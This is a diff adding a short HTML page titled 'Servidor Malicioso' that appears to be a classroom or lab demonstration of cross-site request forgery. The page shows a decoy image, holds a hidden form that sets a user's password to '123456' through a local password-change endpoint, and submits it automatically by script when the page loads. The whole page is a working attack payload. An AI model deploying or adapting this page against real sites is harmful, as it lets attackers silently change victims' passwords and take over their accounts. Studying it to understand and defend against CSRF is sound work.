@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <title>Servidor Malicioso</title>
+</head>
+
+<body>
+    <img src="./pixel-game.gif" alt="" />
+    <form enctype="multipart/form-data" action="http://localhost:3000/usuario/alterar-senha" method="post">
+        <input type="hidden" name="senha" value="123456" />
+        <input type="hidden" name="confirmacao" value="123456" />
+    </form>
+    <script>
+        document.forms[0].submit()
+    </script>
+</body>
+
+</html>
